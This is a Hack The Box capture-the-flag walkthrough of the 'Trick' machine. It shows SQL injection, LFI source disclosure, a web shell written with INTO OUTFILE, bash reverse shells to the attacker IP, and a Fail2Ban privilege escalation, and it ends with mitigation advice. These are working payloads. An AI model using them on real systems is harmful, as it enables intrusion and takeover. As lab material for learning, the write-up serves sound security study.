---
layout: post
title: Hack The Box Walkthrough - Trick
date: 2022-06-19
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Easy
- Machine
permalink: /2022/06/HTB/Trick
img: 2022/06/Trick/Trick.png
---

In this machine, I had to perform some SQL Injection, exploit two Local File Inclusion(LFI) vulnerabilities, and finally escalate privileges by using Fail2Ban misconfiguration.

* Room: Trick
* Difficulty: Easy
* URL: [https://app.hackthebox.com/machines/Trick](https://app.hackthebox.com/machines/Trick)
* Author: [Geiseric](https://app.hackthebox.com/users/184611)

## Open Ports

I started by launching rustscan to scan for open ports.

```bash
$ rustscan -a target.htb -- -A -Pn | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.194.224:22
Open 10.129.194.224:53
Open 10.129.194.224:25
Open 10.129.194.224:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
...
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5Rh57OmAndXFukHce0Tr4BL8CWC8yACwWdu8VZcBPGuMUH8VkvzqseeC8MYxt5SPL1aJmAsZSgOUreAJNlYNBBKjMoFwyDdArWhqDThlgBf6aqwqMRo3XWIcbQOBkrisgqcPnRKlwh+vqArsj5OAZaUq8zs7Q3elE6HrDnj779JHCc5eba+DR+Cqk1u4JxfC6mGsaNMAXoaRKsAYlwf4Yjhonl6A6MkWszz7t9q5r2bImuYAC0cvgiHJdgLcr0WJh+lV8YIkPyya1vJFp1gN4Pg7I6CmMaiWSMgSem5aVlKmrLMX10MWhewnyuH2ekMFXUKJ8wv4DgifiAIvd6AGR
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAoXvyMKuWhQvWx52EFXK9ytX/pGmjZptG8Kb+DOgKcGeBgGPKX3ZpryuGR44av0WnKP0gnRLWk7UCbqY3mxXU0=
|   256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGY1WZWn9xuvXhfxFFm82J9eRGNYJ9NnfzECUm0faUXm
25/tcp open  smtp?   syn-ack
|_smtp-commands: Couldn't establish connection on port 25
53/tcp open  domain  syn-ack ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid:
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    syn-ack nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
...
```
There were four open ports:

* 22 - SSH
* 25 - SMTP
* 53 - DNS
* 80 - HTTP


## Payroll Site

I looked at the website on port 80.

![Coming Soon](/assets/images/2022/06/Trick/ComingSoon.png "Coming Soon")

The site did not have much on it. I ran feroxbuster and it did not find anything.

Port 53 was opened and running bind, so I looked for ways to interrogate it for domain names.

```bash
$ dig axfr trick.htb @10.129.194.224

; <<>> DiG 9.18.1-1-Debian <<>> axfr trick.htb @10.129.194.224
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 28 msec
;; SERVER: 10.129.194.224#53(10.129.194.224) (TCP)
;; WHEN: Sun Jun 19 08:33:22 EDT 2022
;; XFR size: 6 records (messages 1, bytes 231)
```

I added `trick.htb`, `root.trick.htb`, and `preprod-payroll.trick.htb` to my hosts file. Then I looked at the sites on those domain names. Only the payroll domain had a new site.

![Payroll Login](/assets/images/2022/06/Trick/PayrollLogin.png "Payroll Login")

I tried random credentials, the site did not say if a username existed or not. I then tried simple SQL Injection by using the username `' or 1 = 1 -- -` and it worked. I was connected as the administrator.

![Welcome Back Admin](/assets/images/2022/06/Trick/WelcomBackAdmin.png "Welcome Back Admin")

Once connected, I was sent to `http://preprod-payroll.trick.htb/index.php?page=home`. The `page` parameter looked like it could be vulnerable to LFI. I had run feroxbuster on the site, so I knew there was a file called `home.php`. The vulnerable code must have been adding the `.php` after the file name.

I tried reading the index.php file using LFI and PHP stream filters to get it as base64. I loaded `http://preprod-payroll.trick.htb/index.php?page=php://filter/convert.base64-encode/resource=index`. It returned the encoded source code for the file. I saved it to a file and decoded it with `base64 -d index.b64 > index.php`.

Amongst the returned code, there was the part with the LFI vulnerability. With this, I could read any PHP file from the server.

```php
<main id="view-panel" >
    <?php $page = isset($_GET['page']) ? $_GET['page'] :'home'; ?>
  <?php include $page.'.php' ?>
</main>
```

The site had a lot of PHP files. So I wrote a small script to extract them all and save them locally.

```python
#!/bin/env python

import requests
from bs4 import BeautifulSoup
import base64

files = [
    'index',
    'login',
    'ajax',
    'home',
    'users',
    'header',
    'employee',
    'navbar',
    'department',
    'db_connect',
    'payroll',
    'position',
    'topbar',
    'attendance',
    'site_settings',
    'admin_class',
    'manage_user',
    'manage_attendance',
    'view_attendance',
    'manage_employee',
    'view_employee',
    'voting',
    'manage_payroll',
]


cookies = {'PHPSESSID': '4fkg0j3pttkh29sqcc1jnct07g'}
for file in files:
    url = f'http://preprod-payroll.trick.htb/index.php?page=php://filter/convert.base64-encode/resource={file}'
    response = requests.get(url, cookies=cookies)

    soup = BeautifulSoup(response.text, 'html.parser')
    main_div = soup.find_all(id='view-panel')

    b64 = main_div[0].text.strip()
    php_code = str(base64.urlsafe_b64decode(b64), 'utf-8')

    file_name = f'{file}.php'
    file = open(file_name, "w")
    file.write(php_code)
    file.close()
```

I ran the script and looked at all the files it extracted. The `site_settings` page looked interesting. It allowed uploading an image. So I thought I could use it to upload a PHP file, then use the LFI vulnerability to execute the code. But the upload failed. The target folder was not writeable.

I kept looking at the extracted PHP file. And I kept seeing SQL injection all over the place. After some time, I realised I could use this to write a file on disk with `SELECT INTO OUTFILE`. I could then load and execute that file with the LFI.

I used the view employee functionallity to perform the injection. I experimented with the page a little bit to read some data. Then used it to write some PHP code in a file.


```
GET /view_employee.php?id=90 UNION Select 1, '<?php $cmd=$_GET["cmd"]; echo `$cmd`; ?>', 3, 4, 5, 6, 7, 8, 9, 10 Into outfile '/tmp/rce.php' HTTP/1.1
Host: preprod-payroll.trick.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://preprod-payroll.trick.htb/index.php?page=employee
Cookie: PHPSESSID=4fkg0j3pttkh29sqcc1jnct07g
```

This returned an error. But I used the LFI to load the `/tmp/rce.php` file and execute a command.

I loaded

`http://preprod-payroll.trick.htb/index.php?page=/tmp/rce&cmd=id`

and it returned

`1 uid=33(www-data) gid=33(www-data) groups=33(www-data) 3 4 5 6 7 8 9 10`

I built a reverse shell call in base64.

```bash
$ echo 'bash  -i >& /dev/tcp/10.10.14.130/4444 0>&1 ' | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTMwLzQ0NDQgMD4mMSAK
```

And sent it to the server.

```
GET /index.php?page=/tmp/rce&cmd=echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTMwLzQ0NDQgMD4mMSAK | base64 -d | bash HTTP/1.1
Host: preprod-payroll.trick.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=4fkg0j3pttkh29sqcc1jnct07g
Upgrade-Insecure-Requests: 1
```

My netcat listener got the connection, and I was on the server.

```bash
$ nc -klvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.194.224 60430
bash: cannot set terminal process group (724): Inappropriate ioctl for device
bash: no job control in this shell

www-data@trick:~/payroll$ whoami
whoami
www-data
```



## Marketing Site

Once connected, I looked at `/etc/passwd` for other users on the box.

```bash
www-data@trick:~/payroll$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
bind:x:120:128::/var/cache/bind:/usr/sbin/nologin
michael:x:1001:1001::/home/michael:/bin/bash
```

There was a user called michael. I looked at the running process and saw that some `php-fpm` instances were running as this user.

```bash
www-data@trick:~/payroll$ ps aux | grep michael
ps aux | grep michael
michael     750  0.0  0.4 197252  8992 ?        S    05:22   0:00 php-fpm: pool michael
michael     752  0.0  0.4 197252  8992 ?        S    05:22   0:00 php-fpm: pool michael
www-data   3721  0.0  0.0   3212   820 ?        S    11:26   0:00 grep michael
```

The nginx configuration showed that there was a marketing site running on the server.

```nginx
www-data@trick:~/payroll$ cat /etc/nginx/sites-enabled/default
cat /etc/nginx/sites-enabled/default

...
server {
        listen 80;
        listen [::]:80;

        server_name preprod-marketing.trick.htb;

        root /var/www/market;
        index index.php;

        location / {
                try_files $uri $uri/ =404;
        }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;
        }
}
...
```

I looked at the source code for the site and found another clear LFI vulnerability.

```bash
www-data@trick:~/payroll$ cd /var/www/market
cd /var/www/market

www-data@trick:~/market$ ls
ls
about.html
contact.html
css
fontawesome
home.html
img
index.php
js
services.html

www-data@trick:~/market$ cat index.php
cat index.php
<?php
$file = $_GET['page'];

if(!isset($file) || ($file=="index.php")) {
   include("/var/www/market/home.html");
}
else{
        include("/var/www/market/".str_replace("../","",$file));
}
```

This code includes any file passed as the `page` parameter. It removes `../` from it in an attempt to prevent path traversal. But that's easy to bypass. I just needed to insert a second `../` inside any instance I needed in my path.

```php
php > echo str_replace('../', '', '../etc/passwd');
etc/passwd
php > echo str_replace('../', '', '....//etc/passwd');
../etc/passwd
```

I create a second file in `/tmp` to launch a reverse shell on a different port.

```bash
www-data@trick:~/market$ cat /tmp/rce2.php
<?php
`bash -c 'bash -i >& /dev/tcp/10.10.14.130/4445 0>&1'`;
```

I added the `preprod-marketing.trick.htb` domain to my hosts file and used the LFI to load the new file by navigating to [http://preprod-marketing.trick.htb/?page=..././..././..././tmp/rce2.php](http://preprod-marketing.trick.htb/?page=..././..././..././tmp/rce2.php).

This got me a reverse shell as michael, and the user flag.

```bash
$ nc -klvnp 4445
Listening on 0.0.0.0 4445
Connection received on 10.129.115.24 53350
bash: cannot set terminal process group (726): Inappropriate ioctl for device
bash: no job control in this shell

michael@trick:/var/www/market$ whoami
whoami
michael

michael@trick:/var/www/market$ cd ~
cd ~

michael@trick:~$ ls
ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
user.txt

michael@trick:~$ cat user.txt
cat user.txt
REDACTED
```

## Getting root

Before looking at ways to escalate privileges, I looked at `.ssh` inside michael's home folder. It contained a private key, so I copied it on my machine and used it to reconnect to the server.

```bash
$ ssh -i michael_id_rsa michael@target
Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
michael@trick:~$
```

After I had a better connection, I checked if michael could run anything with sudo.

```bash
michael@trick:~$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

They could restart Fail2Ban. I looked on GTFOBins for Fail2Ban, but I did not find anything. When I ran the command, it said it was using `systemctl`.


```bash
michael@trick:~$ sudo /etc/init.d/fail2ban restart
[....] Restarting fail2ban (via systemctl): fail2ban.service
. ok
```

GTFOBins has something for [systemctl](https://gtfobins.github.io/gtfobins/systemctl/#sudo), but I could not use it on that machine.

I looked around and saw that michael could write in the `action.d` repository of the Fail2Ban configuration since they were part of the `security` group. They could not modify any of the existing files, but they could create new files.

```bash
michael@trick:~$ cd /etc/fail2ban/

michael@trick:/etc/fail2ban$ ls -la
total 76
drwxr-xr-x   6 root root      4096 Jun 20 11:57 .
drwxr-xr-x 126 root root     12288 Jun 20 11:53 ..
drwxrwx---   2 root security  4096 Jun 20 11:57 action.d
-rw-r--r--   1 root root      2334 Jun 20 11:57 fail2ban.conf
drwxr-xr-x   2 root root      4096 Jun 20 11:57 fail2ban.d
drwxr-xr-x   3 root root      4096 Jun 20 11:57 filter.d
-rw-r--r--   1 root root     22908 Jun 20 11:57 jail.conf
drwxr-xr-x   2 root root      4096 Jun 20 11:57 jail.d
-rw-r--r--   1 root root       645 Jun 20 11:57 paths-arch.conf
-rw-r--r--   1 root root      2827 Jun 20 11:57 paths-common.conf
-rw-r--r--   1 root root       573 Jun 20 11:57 paths-debian.conf
-rw-r--r--   1 root root       738 Jun 20 11:57 paths-opensuse.conf
michael@trick:/etc/fail2ban$ groups
michael security

michael@trick:/etc/fail2ban$ ls -l action.d/
total 280
-rw-r--r-- 1 root root  3879 Jun 20 12:00 abuseipdb.conf
-rw-r--r-- 1 root root   587 Jun 20 12:00 apf.conf
-rw-r--r-- 1 root root   629 Jun 20 12:00 badips.conf
-rw-r--r-- 1 root root 10918 Jun 20 12:00 badips.py
-rw-r--r-- 1 root root  2631 Jun 20 12:00 blocklist_de.conf
...
```

I started searching for ways to exploit Fail2Ban if I could add new actions. I found a great [post from DigitalOcean](https://www.digitalocean.com/community/tutorials/how-fail2ban-works-to-protect-services-on-a-linux-server) on how to configure it. And another [post on abusing it](https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7). 

The post on abusing Fail2Ban required the permission to modify a file in `action.d`. I could not do this, but I could create new files. 

Fail2Ban was enabled for sshd.

```
# /etc/fail2ban/jail.d/defaults-debian.conf
[sshd]
enabled = true
```

The sshd section did not have an action configured, so it used the default settings.

```
# /etc/fail2ban/jail.conf

...

[DEFAULT]                                                                                                            

# "bantime" is the number of seconds that a host is banned.
bantime  = 10s

# A host is banned if it has generated "maxretry" during the last "findtime"
# seconds.
findtime  = 10s

# "maxretry" is the number of failures before a host get banned.
maxretry = 5

#
# ACTIONS
#

banaction = iptables-multiport
banaction_allports = iptables-allports


#
# JAILS            
#                                                                                                                    
                                                                                                                     
#                                                                                                                    
# SSH servers           
#                              

[sshd] 
                                                          
# To use more aggressive sshd modes set filter parameter "mode" in jail.local:
# normal (default), ddos, extra or aggressive (combines all).
# See "tests/files/logs/sshd" or "filter.d/sshd.conf" for usage example and details.
#mode   = normal    
port    = ssh                                                                                                        
logpath = %(sshd_log)s
backend = %(sshd_backend)s
bantime = 10s    
```

If someone had too many failed login attempts, Fail2Ban would use the file `/etc/fail2ban/action.d/iptables-multiport.conf` to determine which action to take. 


```
# /etc/fail2ban/action.d/iptables-multiport.conf

[INCLUDES]

before = iptables-common.conf

[Definition]

# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
```

This would call iptables, using the command defined in `<iptables>`. It also included the file `/etc/fail2ban/action.d/iptables-common.conf` where iptables was defined. 

```
# /etc/fail2ban/action.d/iptables-common.conf

# Fail2Ban configuration file
#                                                                                                                    
# Author: Daniel Black                                                                                               
#                                                                                                                    
# This is a included configuration file and includes the definitions for the iptables
# used in all iptables based actions by default.      
#
# The user can override the defaults in iptables-common.local
#                                                                                                                    
# Modified: Alexander Koeppe <format_c@online.de>, Serg G. Brester <serg.brester@sebres.de>
#       made config file IPv6 capable (see new section Init?family=inet6)

[INCLUDES]
                                                          
after = iptables-blocktype.local                                                                                     
        iptables-common.local                                                                                        
# iptables-blocktype.local is obsolete 


[Init]             

# Option:  iptables
# Notes.:  Actual command to be executed, including common to all calls options
# Values:  STRING
iptables = iptables <lockingopt>
```

This file also included `/etc/fail2ban/action.d/iptables-common.local` to allow overriding some options. And this file did not exists. So I could create it and replace the call to iptables by a reverse shell. 

I create my fake iptables command. 

```bash
michael@trick:/etc/fail2ban$ cat /tmp/iptables
#!/bin/sh
bash -c 'bash -i >& /dev/tcp/10.10.14.130/4444 0>&1'
```

Then I created the override file to call my command instead of iptables and I restarted Fail2Ban. 

```bash
michael@trick:/etc/fail2ban$ cat /etc/fail2ban/action.d/iptables-common.local
[Init]

iptables = /tmp/iptables <lockingopt>

michael@trick:/etc/fail2ban$ sudo /etc/init.d/fail2ban restart
[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
```

Next, I started a netcat listener and tried to ssh to the machine a few times with bad credentials. 


```bash
$ nc -klvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.115.62 35982
bash: cannot set terminal process group (4365): Inappropriate ioctl for device
bash: no job control in this shell
root@trick:/# cd /root
cd /root

root@trick:/root# cat root.txt
cat root.txt
REDACTED
```

## Mitigation

There were a few issues that could be fixed on this box to help prevent it from being hacked. 

The application for the payroll builds all its query by appending user's input to the SQL. This opens all the pages to SQL Injection. It does not even try to escape the data in any way. 

```php
$qry = $this->db->query("SELECT * FROM users where username = '".$username."' and password = '".$password."' ");

$qry = $conn->query("SELECT * FROM employee where id = ".$_GET['id'])->fetch_array();
```

Prepared statements should be used to query the database all the time. This would have blocked me from the initial access to the application. 

Next, the code uses [extract](https://www.php.net/manual/en/function.extract.php) to import the GET and POST variables into PHP variables. I did not use this on the box, but it could be used to overwrite some variables. The documentation says to never use it on untrusted data. 

> Warning
> Do not use extract() on untrusted data, like user input (e.g. $_GET, $_FILES).

Next, there were two LFI vulnerabilities in this box. One in the payroll application, and one in the marketing site. 

```php
# Payroll
<?php $page = isset($_GET['page']) ? $_GET['page'] :'home'; ?>
<?php include $page.'.php' ?>
```

```php
# Marketing
include("/var/www/market/".str_replace("../","",$file));
```

Both applications use a GET parameter to decide which page the user wants to see and load it with include. Never use user data in an include statement. The risk of bypassing your protections is too high. Instead, you could have an allowed list of pages and only load files from that list. 

The last issue with that box was with the permissions around Fail2Ban. I don't think giving write access to a user to important configurations like those is a good idea. It's probably something that could be configured by root. And it probably doesn't need to change often. Also, sudo should require a password. I get that it's convenient to not require it, but it opens doors that would be harder to break if a password was required. 

